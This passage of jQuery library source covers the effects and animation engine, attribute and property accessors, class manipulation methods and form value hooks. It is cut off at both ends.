  // Panic based approach to setting things on disconnected nodes
  Tween.propHooks.scrollTop = Tween.propHooks.scrollLeft = {
      set: function( tween ) {
          if ( tween.elem.nodeType && tween.elem.parentNode ) {
              tween.elem[ tween.prop ] = tween.now;
          }
      }
  };

  jQuery.easing = {
      linear: function( p ) {
          return p;
      },
      swing: function( p ) {
          return 0.5 - Math.cos( p * Math.PI ) / 2;
      },
      _default: "swing"
  };

  jQuery.fx = Tween.prototype.init;

  // Back compat <1.8 extension point
  jQuery.fx.step = {};




  var
      fxNow, inProgress,
      rfxtypes = /^(?:toggle|show|hide)$/,
      rrun = /queueHooks$/;

  function schedule() {
      if ( inProgress ) {
          if ( document.hidden === false && window.requestAnimationFrame ) {
              window.requestAnimationFrame( schedule );
          } else {
              window.setTimeout( schedule, jQuery.fx.interval );
          }

          jQuery.fx.tick();
      }
  }

  // Animations created synchronously will run synchronously
  function createFxNow() {
      window.setTimeout( function() {
          fxNow = undefined;
      } );
      return ( fxNow = jQuery.now() );
  }

  // Generate parameters to create a standard animation
  function genFx( type, includeWidth ) {
      var which,
          i = 0,
          attrs = { height: type };

      // If we include width, step value is 1 to do all cssExpand values,
      // otherwise step value is 2 to skip over Left and Right
      includeWidth = includeWidth ? 1 : 0;
      for ( ; i < 4; i += 2 - includeWidth ) {
          which = cssExpand[ i ];
          attrs[ "margin" + which ] = attrs[ "padding" + which ] = type;
      }

      if ( includeWidth ) {
          attrs.opacity = attrs.width = type;
      }

      return attrs;
  }

  function createTween( value, prop, animation ) {
      var tween,
          collection = ( Animation.tweeners[ prop ] || [] ).concat( Animation.tweeners[ "*" ] ),
          index = 0,
          length = collection.length;
      for ( ; index < length; index++ ) {
          if ( ( tween = collection[ index ].call( animation, prop, value ) ) ) {

              // We're done with this property
              return tween;
          }
      }
  }

  function defaultPrefilter( elem, props, opts ) {
      var prop, value, toggle, hooks, oldfire, propTween, restoreDisplay, display,
          isBox = "width" in props || "height" in props,
          anim = this,
          orig = {},
          style = elem.style,
          hidden = elem.nodeType && isHiddenWithinTree( elem ),
          dataShow = dataPriv.get( elem, "fxshow" );

      // Queue-skipping animations hijack the fx hooks
      if ( !opts.queue ) {
          hooks = jQuery._queueHooks( elem, "fx" );
          if ( hooks.unqueued == null ) {
              hooks.unqueued = 0;
              oldfire = hooks.empty.fire;
              hooks.empty.fire = function() {
                  if ( !hooks.unqueued ) {
                      oldfire();
                  }
              };
          }
          hooks.unqueued++;

          anim.always( function() {

              // Ensure the complete handler is called before this completes
              anim.always( function() {
                  hooks.unqueued--;
                  if ( !jQuery.queue( elem, "fx" ).length ) {
                      hooks.empty.fire();
                  }
              } );
          } );
      }

      // Detect show/hide animations
      for ( prop in props ) {
          value = props[ prop ];
          if ( rfxtypes.test( value ) ) {
              delete props[ prop ];
              toggle = toggle || value === "toggle";
              if ( value === ( hidden ? "hide" : "show" ) ) {

                  // Pretend to be hidden if this is a "show" and
                  // there is still data from a stopped show/hide
                  if ( value === "show" && dataShow && dataShow[ prop ] !== undefined ) {
                      hidden = true;

                  // Ignore all other no-op show/hide data
                  } else {
                      continue;
                  }
              }
              orig[ prop ] = dataShow && dataShow[ prop ] || jQuery.style( elem, prop );
          }
      }

      // Bail out if this is a no-op like .hide().hide()
      propTween = !jQuery.isEmptyObject( props );
      if ( !propTween && jQuery.isEmptyObject( orig ) ) {
          return;
      }

      // Restrict "overflow" and "display" styles during box animations
      if ( isBox && elem.nodeType === 1 ) {

          // Support: IE <=9 - 11, Edge 12 - 13
          // Record all 3 overflow attributes because IE does not infer the shorthand
          // from identically-valued overflowX and overflowY
          opts.overflow = [ style.overflow, style.overflowX, style.overflowY ];

          // Identify a display type, preferring old show/hide data over the CSS cascade
          restoreDisplay = dataShow && dataShow.display;
          if ( restoreDisplay == null ) {
              restoreDisplay = dataPriv.get( elem, "display" );
          }
          display = jQuery.css( elem, "display" );
          if ( display === "none" ) {
              if ( restoreDisplay ) {
                  display = restoreDisplay;
              } else {

                  // Get nonempty value(s) by temporarily forcing visibility
                  showHide( [ elem ], true );
                  restoreDisplay = elem.style.display || restoreDisplay;
                  display = jQuery.css( elem, "display" );
                  showHide( [ elem ] );
              }
          }

          // Animate inline elements as inline-block
          if ( display === "inline" || display === "inline-block" && restoreDisplay != null ) {
              if ( jQuery.css( elem, "float" ) === "none" ) {

                  // Restore the original display value at the end of pure show/hide animations
                  if ( !propTween ) {
                      anim.done( function() {
                          style.display = restoreDisplay;
                      } );
                      if ( restoreDisplay == null ) {
                          display = style.display;
                          restoreDisplay = display === "none" ? "" : display;
                      }
                  }
                  style.display = "inline-block";
              }
          }
      }

      if ( opts.overflow ) {
          style.overflow = "hidden";
          anim.always( function() {
              style.overflow = opts.overflow[ 0 ];
              style.overflowX = opts.overflow[ 1 ];
              style.overflowY = opts.overflow[ 2 ];
          } );
      }

      // Implement show/hide animations
      propTween = false;
      for ( prop in orig ) {

          // General show/hide setup for this element animation
          if ( !propTween ) {
              if ( dataShow ) {
                  if ( "hidden" in dataShow ) {
                      hidden = dataShow.hidden;
                  }
              } else {
                  dataShow = dataPriv.access( elem, "fxshow", { display: restoreDisplay } );
              }

              // Store hidden/visible for toggle so `.stop().toggle()` "reverses"
              if ( toggle ) {
                  dataShow.hidden = !hidden;
              }

              // Show elements before animating them
              if ( hidden ) {
                  showHide( [ elem ], true );
              }

              /* eslint-disable no-loop-func */

              anim.done( function() {

              /* eslint-enable no-loop-func */

                  // The final step of a "hide" animation is actually hiding the element
                  if ( !hidden ) {
                      showHide( [ elem ] );
                  }
                  dataPriv.remove( elem, "fxshow" );
                  for ( prop in orig ) {
                      jQuery.style( elem, prop, orig[ prop ] );
                  }
              } );
          }

          // Per-property setup
          propTween = createTween( hidden ? dataShow[ prop ] : 0, prop, anim );
          if ( !( prop in dataShow ) ) {
              dataShow[ prop ] = propTween.start;
              if ( hidden ) {
                  propTween.end = propTween.start;
                  propTween.start = 0;
              }
          }
      }
  }

  function propFilter( props, specialEasing ) {
      var index, name, easing, value, hooks;

      // camelCase, specialEasing and expand cssHook pass
      for ( index in props ) {
          name = jQuery.camelCase( index );
          easing = specialEasing[ name ];
          value = props[ index ];
          if ( Array.isArray( value ) ) {
              easing = value[ 1 ];
              value = props[ index ] = value[ 0 ];
          }

          if ( index !== name ) {
              props[ name ] = value;
              delete props[ index ];
          }

          hooks = jQuery.cssHooks[ name ];
          if ( hooks && "expand" in hooks ) {
              value = hooks.expand( value );
              delete props[ name ];

              // Not quite $.extend, this won't overwrite existing keys.
              // Reusing 'index' because we have the correct "name"
              for ( index in value ) {
                  if ( !( index in props ) ) {
                      props[ index ] = value[ index ];
                      specialEasing[ index ] = easing;
                  }
              }
          } else {
              specialEasing[ name ] = easing;
          }
      }
  }

  function Animation( elem, properties, options ) {
      var result,
          stopped,
          index = 0,
          length = Animation.prefilters.length,
          deferred = jQuery.Deferred().always( function() {

              // Don't match elem in the :animated selector
              delete tick.elem;
          } ),
          tick = function() {
              if ( stopped ) {
                  return false;
              }
              var currentTime = fxNow || createFxNow(),
                  remaining = Math.max( 0, animation.startTime + animation.duration - currentTime ),

                  // Support: Android 2.3 only
                  // Archaic crash bug won't allow us to use `1 - ( 0.5 || 0 )` (#12497)
                  temp = remaining / animation.duration || 0,
                  percent = 1 - temp,
                  index = 0,
                  length = animation.tweens.length;

              for ( ; index < length; index++ ) {
                  animation.tweens[ index ].run( percent );
              }

              deferred.notifyWith( elem, [ animation, percent, remaining ] );

              // If there's more to do, yield
              if ( percent < 1 && length ) {
                  return remaining;
              }

              // If this was an empty animation, synthesize a final progress notification
              if ( !length ) {
                  deferred.notifyWith( elem, [ animation, 1, 0 ] );
              }

              // Resolve the animation and report its conclusion
              deferred.resolveWith( elem, [ animation ] );
              return false;
          },
          animation = deferred.promise( {
              elem: elem,
              props: jQuery.extend( {}, properties ),
              opts: jQuery.extend( true, {
                  specialEasing: {},
                  easing: jQuery.easing._default
              }, options ),
              originalProperties: properties,
              originalOptions: options,
              startTime: fxNow || createFxNow(),
              duration: options.duration,
              tweens: [],
              createTween: function( prop, end ) {
                  var tween = jQuery.Tween( elem, animation.opts, prop, end,
                          animation.opts.specialEasing[ prop ] || animation.opts.easing );
                  animation.tweens.push( tween );
                  return tween;
              },
              stop: function( gotoEnd ) {
                  var index = 0,

                      // If we are going to the end, we want to run all the tweens
                      // otherwise we skip this part
                      length = gotoEnd ? animation.tweens.length : 0;
                  if ( stopped ) {
                      return this;
                  }
                  stopped = true;
                  for ( ; index < length; index++ ) {
                      animation.tweens[ index ].run( 1 );
                  }

                  // Resolve when we played the last frame; otherwise, reject
                  if ( gotoEnd ) {
                      deferred.notifyWith( elem, [ animation, 1, 0 ] );
                      deferred.resolveWith( elem, [ animation, gotoEnd ] );
                  } else {
                      deferred.rejectWith( elem, [ animation, gotoEnd ] );
                  }
                  return this;
              }
          } ),
          props = animation.props;

      propFilter( props, animation.opts.specialEasing );

      for ( ; index < length; index++ ) {
          result = Animation.prefilters[ index ].call( animation, elem, props, animation.opts );
          if ( result ) {
              if ( jQuery.isFunction( result.stop ) ) {
                  jQuery._queueHooks( animation.elem, animation.opts.queue ).stop =
                      jQuery.proxy( result.stop, result );
              }
              return result;
          }
      }

      jQuery.map( props, createTween, animation );

      if ( jQuery.isFunction( animation.opts.start ) ) {
          animation.opts.start.call( elem, animation );
      }

      // Attach callbacks from options
      animation
          .progress( animation.opts.progress )
          .done( animation.opts.done, animation.opts.complete )
          .fail( animation.opts.fail )
          .always( animation.opts.always );

      jQuery.fx.timer(
          jQuery.extend( tick, {
              elem: elem,
              anim: animation,
              queue: animation.opts.queue
          } )
      );

      return animation;
  }

  jQuery.Animation = jQuery.extend( Animation, {

      tweeners: {
          "*": [ function( prop, value ) {
              var tween = this.createTween( prop, value );
              adjustCSS( tween.elem, prop, rcssNum.exec( value ), tween );
              return tween;
          } ]
      },

      tweener: function( props, callback ) {
          if ( jQuery.isFunction( props ) ) {
              callback = props;
              props = [ "*" ];
          } else {
              props = props.match( rnothtmlwhite );
          }

          var prop,
              index = 0,
              length = props.length;

          for ( ; index < length; index++ ) {
              prop = props[ index ];
              Animation.tweeners[ prop ] = Animation.tweeners[ prop ] || [];
              Animation.tweeners[ prop ].unshift( callback );
          }
      },

      prefilters: [ defaultPrefilter ],

      prefilter: function( callback, prepend ) {
          if ( prepend ) {
              Animation.prefilters.unshift( callback );
          } else {
              Animation.prefilters.push( callback );
          }
      }
  } );

  jQuery.speed = function( speed, easing, fn ) {
      var opt = speed && typeof speed === "object" ? jQuery.extend( {}, speed ) : {
          complete: fn || !fn && easing ||
              jQuery.isFunction( speed ) && speed,
          duration: speed,
          easing: fn && easing || easing && !jQuery.isFunction( easing ) && easing
      };

      // Go to the end state if fx are off
      if ( jQuery.fx.off ) {
          opt.duration = 0;

      } else {
          if ( typeof opt.duration !== "number" ) {
              if ( opt.duration in jQuery.fx.speeds ) {
                  opt.duration = jQuery.fx.speeds[ opt.duration ];

              } else {
                  opt.duration = jQuery.fx.speeds._default;
              }
          }
      }

      // Normalize opt.queue - true/undefined/null -> "fx"
      if ( opt.queue == null || opt.queue === true ) {
          opt.queue = "fx";
      }

      // Queueing
      opt.old = opt.complete;

      opt.complete = function() {
          if ( jQuery.isFunction( opt.old ) ) {
              opt.old.call( this );
          }

          if ( opt.queue ) {
              jQuery.dequeue( this, opt.queue );
          }
      };

      return opt;
  };

  jQuery.fn.extend( {
      fadeTo: function( speed, to, easing, callback ) {

          // Show any hidden elements after setting opacity to 0
          return this.filter( isHiddenWithinTree ).css( "opacity", 0 ).show()

              // Animate to the value specified
              .end().animate( { opacity: to }, speed, easing, callback );
      },
      animate: function( prop, speed, easing, callback ) {
          var empty = jQuery.isEmptyObject( prop ),
              optall = jQuery.speed( speed, easing, callback ),
              doAnimation = function() {

                  // Operate on a copy of prop so per-property easing won't be lost
                  var anim = Animation( this, jQuery.extend( {}, prop ), optall );

                  // Empty animations, or finishing resolves immediately
                  if ( empty || dataPriv.get( this, "finish" ) ) {
                      anim.stop( true );
                  }
              };
              doAnimation.finish = doAnimation;

          return empty || optall.queue === false ?
              this.each( doAnimation ) :
              this.queue( optall.queue, doAnimation );
      },
      stop: function( type, clearQueue, gotoEnd ) {
          var stopQueue = function( hooks ) {
              var stop = hooks.stop;
              delete hooks.stop;
              stop( gotoEnd );
          };

          if ( typeof type !== "string" ) {
              gotoEnd = clearQueue;
              clearQueue = type;
              type = undefined;
          }
          if ( clearQueue && type !== false ) {
              this.queue( type || "fx", [] );
          }

          return this.each( function() {
              var dequeue = true,
                  index = type != null && type + "queueHooks",
                  timers = jQuery.timers,
                  data = dataPriv.get( this );

              if ( index ) {
                  if ( data[ index ] && data[ index ].stop ) {
                      stopQueue( data[ index ] );
                  }
              } else {
                  for ( index in data ) {
                      if ( data[ index ] && data[ index ].stop && rrun.test( index ) ) {
                          stopQueue( data[ index ] );
                      }
                  }
              }

              for ( index = timers.length; index--; ) {
                  if ( timers[ index ].elem === this &&
                      ( type == null || timers[ index ].queue === type ) ) {

                      timers[ index ].anim.stop( gotoEnd );
                      dequeue = false;
                      timers.splice( index, 1 );
                  }
              }

              // Start the next in the queue if the last step wasn't forced.
              // Timers currently will call their complete callbacks, which
              // will dequeue but only if they were gotoEnd.
              if ( dequeue || !gotoEnd ) {
                  jQuery.dequeue( this, type );
              }
          } );
      },
      finish: function( type ) {
          if ( type !== false ) {
              type = type || "fx";
          }
          return this.each( function() {
              var index,
                  data = dataPriv.get( this ),
                  queue = data[ type + "queue" ],
                  hooks = data[ type + "queueHooks" ],
                  timers = jQuery.timers,
                  length = queue ? queue.length : 0;

              // Enable finishing flag on private data
              data.finish = true;

              // Empty the queue first
              jQuery.queue( this, type, [] );

              if ( hooks && hooks.stop ) {
                  hooks.stop.call( this, true );
              }

              // Look for any active animations, and finish them
              for ( index = timers.length; index--; ) {
                  if ( timers[ index ].elem === this && timers[ index ].queue === type ) {
                      timers[ index ].anim.stop( true );
                      timers.splice( index, 1 );
                  }
              }

              // Look for any animations in the old queue and finish them
              for ( index = 0; index < length; index++ ) {
                  if ( queue[ index ] && queue[ index ].finish ) {
                      queue[ index ].finish.call( this );
                  }
              }

              // Turn off finishing flag
              delete data.finish;
          } );
      }
  } );

  jQuery.each( [ "toggle", "show", "hide" ], function( i, name ) {
      var cssFn = jQuery.fn[ name ];
      jQuery.fn[ name ] = function( speed, easing, callback ) {
          return speed == null || typeof speed === "boolean" ?
              cssFn.apply( this, arguments ) :
              this.animate( genFx( name, true ), speed, easing, callback );
      };
  } );

  // Generate shortcuts for custom animations
  jQuery.each( {
      slideDown: genFx( "show" ),
      slideUp: genFx( "hide" ),
      slideToggle: genFx( "toggle" ),
      fadeIn: { opacity: "show" },
      fadeOut: { opacity: "hide" },
      fadeToggle: { opacity: "toggle" }
  }, function( name, props ) {
      jQuery.fn[ name ] = function( speed, easing, callback ) {
          return this.animate( props, speed, easing, callback );
      };
  } );

  jQuery.timers = [];
  jQuery.fx.tick = function() {
      var timer,
          i = 0,
          timers = jQuery.timers;

      fxNow = jQuery.now();

      for ( ; i < timers.length; i++ ) {
          timer = timers[ i ];

          // Run the timer and safely remove it when done (allowing for external removal)
          if ( !timer() && timers[ i ] === timer ) {
              timers.splice( i--, 1 );
          }
      }

      if ( !timers.length ) {
          jQuery.fx.stop();
      }
      fxNow = undefined;
  };

  jQuery.fx.timer = function( timer ) {
      jQuery.timers.push( timer );
      jQuery.fx.start();
  };

  jQuery.fx.interval = 13;
  jQuery.fx.start = function() {
      if ( inProgress ) {
          return;
      }

      inProgress = true;
      schedule();
  };

  jQuery.fx.stop = function() {
      inProgress = null;
  };

  jQuery.fx.speeds = {
      slow: 600,
      fast: 200,

      // Default speed
      _default: 400
  };


  // Based off of the plugin by Clint Helfers, with permission.
  // https://web.archive.org/web/20100324014747/http://blindsignals.com/index.php/2009/07/jquery-delay/
  jQuery.fn.delay = function( time, type ) {
      time = jQuery.fx ? jQuery.fx.speeds[ time ] || time : time;
      type = type || "fx";

      return this.queue( type, function( next, hooks ) {
          var timeout = window.setTimeout( next, time );
          hooks.stop = function() {
              window.clearTimeout( timeout );
          };
      } );
  };


  ( function() {
      var input = document.createElement( "input" ),
          select = document.createElement( "select" ),
          opt = select.appendChild( document.createElement( "option" ) );

      input.type = "checkbox";

      // Support: Android <=4.3 only
      // Default value for a checkbox should be "on"
      support.checkOn = input.value !== "";

      // Support: IE <=11 only
      // Must access selectedIndex to make default options select
      support.optSelected = opt.selected;

      // Support: IE <=11 only
      // An input loses its value after becoming a radio
      input = document.createElement( "input" );
      input.value = "t";
      input.type = "radio";
      support.radioValue = input.value === "t";
  } )();


  var boolHook,
      attrHandle = jQuery.expr.attrHandle;

  jQuery.fn.extend( {
      attr: function( name, value ) {
          return access( this, jQuery.attr, name, value, arguments.length > 1 );
      },

      removeAttr: function( name ) {
          return this.each( function() {
              jQuery.removeAttr( this, name );
          } );
      }
  } );

  jQuery.extend( {
      attr: function( elem, name, value ) {
          var ret, hooks,
              nType = elem.nodeType;

          // Don't get/set attributes on text, comment and attribute nodes
          if ( nType === 3 || nType === 8 || nType === 2 ) {
              return;
          }

          // Fallback to prop when attributes are not supported
          if ( typeof elem.getAttribute === "undefined" ) {
              return jQuery.prop( elem, name, value );
          }

          // Attribute hooks are determined by the lowercase version
          // Grab necessary hook if one is defined
          if ( nType !== 1 || !jQuery.isXMLDoc( elem ) ) {
              hooks = jQuery.attrHooks[ name.toLowerCase() ] ||
                  ( jQuery.expr.match.bool.test( name ) ? boolHook : undefined );
          }

          if ( value !== undefined ) {
              if ( value === null ) {
                  jQuery.removeAttr( elem, name );
                  return;
              }

              if ( hooks && "set" in hooks &&
                  ( ret = hooks.set( elem, value, name ) ) !== undefined ) {
                  return ret;
              }

              elem.setAttribute( name, value + "" );
              return value;
          }

          if ( hooks && "get" in hooks && ( ret = hooks.get( elem, name ) ) !== null ) {
              return ret;
          }

          ret = jQuery.find.attr( elem, name );

          // Non-existent attributes return null, we normalize to undefined
          return ret == null ? undefined : ret;
      },

      attrHooks: {
          type: {
              set: function( elem, value ) {
                  if ( !support.radioValue && value === "radio" &&
                      nodeName( elem, "input" ) ) {
                      var val = elem.value;
                      elem.setAttribute( "type", value );
                      if ( val ) {
                          elem.value = val;
                      }
                      return value;
                  }
              }
          }
      },

      removeAttr: function( elem, value ) {
          var name,
              i = 0,

              // Attribute names can contain non-HTML whitespace characters
              // https://html.spec.whatwg.org/multipage/syntax.html#attributes-2
              attrNames = value && value.match( rnothtmlwhite );

          if ( attrNames && elem.nodeType === 1 ) {
              while ( ( name = attrNames[ i++ ] ) ) {
                  elem.removeAttribute( name );
              }
          }
      }
  } );

  // Hooks for boolean attributes
  boolHook = {
      set: function( elem, value, name ) {
          if ( value === false ) {

              // Remove boolean attributes when set to false
              jQuery.removeAttr( elem, name );
          } else {
              elem.setAttribute( name, name );
          }
          return name;
      }
  };

  jQuery.each( jQuery.expr.match.bool.source.match( /\w+/g ), function( i, name ) {
      var getter = attrHandle[ name ] || jQuery.find.attr;

      attrHandle[ name ] = function( elem, name, isXML ) {
          var ret, handle,
              lowercaseName = name.toLowerCase();

          if ( !isXML ) {

              // Avoid an infinite loop by temporarily removing this function from the getter
              handle = attrHandle[ lowercaseName ];
              attrHandle[ lowercaseName ] = ret;
              ret = getter( elem, name, isXML ) != null ?
                  lowercaseName :
                  null;
              attrHandle[ lowercaseName ] = handle;
          }
          return ret;
      };
  } );




  var rfocusable = /^(?:input|select|textarea|button)$/i,
      rclickable = /^(?:a|area)$/i;

  jQuery.fn.extend( {
      prop: function( name, value ) {
          return access( this, jQuery.prop, name, value, arguments.length > 1 );
      },

      removeProp: function( name ) {
          return this.each( function() {
              delete this[ jQuery.propFix[ name ] || name ];
          } );
      }
  } );

  jQuery.extend( {
      prop: function( elem, name, value ) {
          var ret, hooks,
              nType = elem.nodeType;

          // Don't get/set properties on text, comment and attribute nodes
          if ( nType === 3 || nType === 8 || nType === 2 ) {
              return;
          }

          if ( nType !== 1 || !jQuery.isXMLDoc( elem ) ) {

              // Fix name and attach hooks
              name = jQuery.propFix[ name ] || name;
              hooks = jQuery.propHooks[ name ];
          }

          if ( value !== undefined ) {
              if ( hooks && "set" in hooks &&
                  ( ret = hooks.set( elem, value, name ) ) !== undefined ) {
                  return ret;
              }

              return ( elem[ name ] = value );
          }

          if ( hooks && "get" in hooks && ( ret = hooks.get( elem, name ) ) !== null ) {
              return ret;
          }

          return elem[ name ];
      },

      propHooks: {
          tabIndex: {
              get: function( elem ) {

                  // Support: IE <=9 - 11 only
                  // elem.tabIndex doesn't always return the
                  // correct value when it hasn't been explicitly set
                  // https://web.archive.org/web/20141116233347/http://fluidproject.org/blog/2008/01/09/getting-setting-and-removing-tabindex-values-with-javascript/
                  // Use proper attribute retrieval(#12072)
                  var tabindex = jQuery.find.attr( elem, "tabindex" );

                  if ( tabindex ) {
                      return parseInt( tabindex, 10 );
                  }

                  if (
                      rfocusable.test( elem.nodeName ) ||
                      rclickable.test( elem.nodeName ) &&
                      elem.href
                  ) {
                      return 0;
                  }

                  return -1;
              }
          }
      },

      propFix: {
          "for": "htmlFor",
          "class": "className"
      }
  } );

  // Support: IE <=11 only
  // Accessing the selectedIndex property
  // forces the browser to respect setting selected
  // on the option
  // The getter ensures a default option is selected
  // when in an optgroup
  // eslint rule "no-unused-expressions" is disabled for this code
  // since it considers such accessions noop
  if ( !support.optSelected ) {
      jQuery.propHooks.selected = {
          get: function( elem ) {

              /* eslint no-unused-expressions: "off" */

              var parent = elem.parentNode;
              if ( parent && parent.parentNode ) {
                  parent.parentNode.selectedIndex;
              }
              return null;
          },
          set: function( elem ) {

              /* eslint no-unused-expressions: "off" */

              var parent = elem.parentNode;
              if ( parent ) {
                  parent.selectedIndex;

                  if ( parent.parentNode ) {
                      parent.parentNode.selectedIndex;
                  }
              }
          }
      };
  }

  jQuery.each( [
      "tabIndex",
      "readOnly",
      "maxLength",
      "cellSpacing",
      "cellPadding",
      "rowSpan",
      "colSpan",
      "useMap",
      "frameBorder",
      "contentEditable"
  ], function() {
      jQuery.propFix[ this.toLowerCase() ] = this;
  } );




      // Strip and collapse whitespace according to HTML spec
      // https://html.spec.whatwg.org/multipage/infrastructure.html#strip-and-collapse-whitespace
      function stripAndCollapse( value ) {
          var tokens = value.match( rnothtmlwhite ) || [];
          return tokens.join( " " );
      }


  function getClass( elem ) {
      return elem.getAttribute && elem.getAttribute( "class" ) || "";
  }

  jQuery.fn.extend( {
      addClass: function( value ) {
          var classes, elem, cur, curValue, clazz, j, finalValue,
              i = 0;

          if ( jQuery.isFunction( value ) ) {
              return this.each( function( j ) {
                  jQuery( this ).addClass( value.call( this, j, getClass( this ) ) );
              } );
          }

          if ( typeof value === "string" && value ) {
              classes = value.match( rnothtmlwhite ) || [];

              while ( ( elem = this[ i++ ] ) ) {
                  curValue = getClass( elem );
                  cur = elem.nodeType === 1 && ( " " + stripAndCollapse( curValue ) + " " );

                  if ( cur ) {
                      j = 0;
                      while ( ( clazz = classes[ j++ ] ) ) {
                          if ( cur.indexOf( " " + clazz + " " ) < 0 ) {
                              cur += clazz + " ";
                          }
                      }

                      // Only assign if different to avoid unneeded rendering.
                      finalValue = stripAndCollapse( cur );
                      if ( curValue !== finalValue ) {
                          elem.setAttribute( "class", finalValue );
                      }
                  }
              }
          }

          return this;
      },

      removeClass: function( value ) {
          var classes, elem, cur, curValue, clazz, j, finalValue,
              i = 0;

          if ( jQuery.isFunction( value ) ) {
              return this.each( function( j ) {
                  jQuery( this ).removeClass( value.call( this, j, getClass( this ) ) );
              } );
          }

          if ( !arguments.length ) {
              return this.attr( "class", "" );
          }

          if ( typeof value === "string" && value ) {
              classes = value.match( rnothtmlwhite ) || [];

              while ( ( elem = this[ i++ ] ) ) {
                  curValue = getClass( elem );

                  // This expression is here for better compressibility (see addClass)
                  cur = elem.nodeType === 1 && ( " " + stripAndCollapse( curValue ) + " " );

                  if ( cur ) {
                      j = 0;
                      while ( ( clazz = classes[ j++ ] ) ) {

                          // Remove *all* instances
                          while ( cur.indexOf( " " + clazz + " " ) > -1 ) {
                              cur = cur.replace( " " + clazz + " ", " " );
                          }
                      }

                      // Only assign if different to avoid unneeded rendering.
                      finalValue = stripAndCollapse( cur );
                      if ( curValue !== finalValue ) {
                          elem.setAttribute( "class", finalValue );
                      }
                  }
              }
          }

          return this;
      },

      toggleClass: function( value, stateVal ) {
          var type = typeof value;

          if ( typeof stateVal === "boolean" && type === "string" ) {
              return stateVal ? this.addClass( value ) : this.removeClass( value );
          }

          if ( jQuery.isFunction( value ) ) {
              return this.each( function( i ) {
                  jQuery( this ).toggleClass(
                      value.call( this, i, getClass( this ), stateVal ),
                      stateVal
                  );
              } );
          }

          return this.each( function() {
              var className, i, self, classNames;

              if ( type === "string" ) {

                  // Toggle individual class names
                  i = 0;
                  self = jQuery( this );
                  classNames = value.match( rnothtmlwhite ) || [];

                  while ( ( className = classNames[ i++ ] ) ) {

                      // Check each className given, space separated list
                      if ( self.hasClass( className ) ) {
                          self.removeClass( className );
                      } else {
                          self.addClass( className );
                      }
                  }

              // Toggle whole class name
              } else if ( value === undefined || type === "boolean" ) {
                  className = getClass( this );
                  if ( className ) {

                      // Store className if set
                      dataPriv.set( this, "__className__", className );
                  }

                  // If the element has a class name or if we're passed `false`,
                  // then remove the whole classname (if there was one, the above saved it).
                  // Otherwise bring back whatever was previously saved (if anything),
                  // falling back to the empty string if nothing was stored.
                  if ( this.setAttribute ) {
                      this.setAttribute( "class",
                          className || value === false ?
                          "" :
                          dataPriv.get( this, "__className__" ) || ""
                      );
                  }
              }
          } );
      },

      hasClass: function( selector ) {
          var className, elem,
              i = 0;

          className = " " + selector + " ";
          while ( ( elem = this[ i++ ] ) ) {
              if ( elem.nodeType === 1 &&
                  ( " " + stripAndCollapse( getClass( elem ) ) + " " ).indexOf( className ) > -1 ) {
                      return true;
              }
          }

          return false;
      }
  } );




  var rreturn = /\r/g;

  jQuery.fn.extend( {
      val: function( value ) {
          var hooks, ret, isFunction,
              elem = this[ 0 ];

          if ( !arguments.length ) {
              if ( elem ) {
                  hooks = jQuery.valHooks[ elem.type ] ||
                      jQuery.valHooks[ elem.nodeName.toLowerCase() ];

                  if ( hooks &&
                      "get" in hooks &&
                      ( ret = hooks.get( elem, "value" ) ) !== undefined
                  ) {
                      return ret;
                  }

                  ret = elem.value;

                  // Handle most common string cases
                  if ( typeof ret === "string" ) {
                      return ret.replace( rreturn, "" );
                  }

                  // Handle cases where value is null/undef or number
                  return ret == null ? "" : ret;
              }

              return;
          }

          isFunction = jQuery.isFunction( value );

          return this.each( function( i ) {
              var val;

              if ( this.nodeType !== 1 ) {
                  return;
              }

              if ( isFunction ) {
                  val = value.call( this, i, jQuery( this ).val() );
              } else {
                  val = value;
              }

              // Treat null/undefined as ""; convert numbers to string
              if ( val == null ) {
                  val = "";

              } else if ( typeof val === "number" ) {
                  val += "";

              } else if ( Array.isArray( val ) ) {
                  val = jQuery.map( val, function( value ) {
                      return value == null ? "" : value + "";
                  } );
              }

              hooks = jQuery.valHooks[ this.type ] || jQuery.valHooks[ this.nodeName.toLowerCase() ];

              // If set returns undefined, fall back to normal setting
              if ( !hooks || !( "set" in hooks ) || hooks.set( this, val, "value" ) === undefined ) {
                  this.value = val;
              }
          } );
      }
  } );

  jQuery.extend( {
      valHooks: {
          option: {
              get: function( elem ) {

                  var val = jQuery.find.attr( elem, "value" );
                  return val != null ?
                      val :

                      // Support: IE <=10 - 11 only
                      // option.text throws exceptions (#14686, #14858)
                      // Strip and collapse whitespace
                      // https://html.spec.whatwg.org/#strip-and-collapse-whitespace
                      stripAndCollapse( jQuery.text( elem ) );
              }
          },
          select: {
              get: function( elem ) {
                  var value, option, i,
                      options = elem.options,
                      index = elem.selectedIndex,
                      one = elem.type === "select-one",
                      values = one ? null : [],
                      max = one ? index + 1 : options.length;

                  if ( index < 0 ) {
                      i = max;

                  } else {
                      i = one ? index : 0;
                  }

                  // Loop through all the selected options
                  for ( ; i < max; i++ ) {
                      option = options[ i ];

                      // Support: IE <=9 only
                      // IE8-9 doesn't update selected after form reset (#2551)
                      if ( ( option.selected || i === index ) &&

                              // Don't return options that are disabled or in a disabled optgroup
                              !option.disabled &&
                              ( !option.parentNode.disabled ||
                                  !nodeName( option.parentNode, "optgroup" ) ) ) {

                          // Get the specific value for the option
                          value = jQuery( option ).val();

                          // We don't need an array for one selects
                          if ( one ) {
                              return value;
                          }

                          // Multi-Selects return an array
                          values.push( value );
                      }
                  }

                  return values;
              },

              set: function( elem, value ) {
                  var optionSet, option,
                      options = elem.options,
                      values = jQuery.makeArray( value ),
                      i = options.length;

                  while ( i-- ) {
                      option = options[ i ];

                      /* eslint-disable no-cond-assign */

                      if ( option.selected =
                          jQuery.inArray( jQuery.valHooks.option.get( option ), values ) > -1
                      ) {
                          optionSet = true;
                      }

                      /* eslint-enable no-cond-assign */
                  }

                  // Force browsers to behave consistently when non-matching value is set
                  if ( !optionSet ) {
                      elem.selectedIndex = -1;
                  }
                  return values;
              }
          }
      }
  } );

  // Radios and checkboxes getter/setter
  jQuery.each( [ "radio", "checkbox" ], function() {
      jQuery.valHooks[ this ] = {
          set: function( elem, value ) {
              if ( Array.isArray( value ) ) {
                  return ( elem.checked = jQuery.inArray( jQuery( elem ).val(), value ) > -1 );
              }
          }
      };
      if ( !support.checkOn ) {
          jQuery.valHooks[ this ].get = function( elem ) {
              return elem.getAttribute( "value" ) === null ? "on" : elem.value;
          };
      }
  } );




  // Return jQuery for attributes-only inclusion


  var rfocusMorph = /^(?:focusinfocus|focusoutblur)$/;

  jQuery.extend( jQuery.event, {

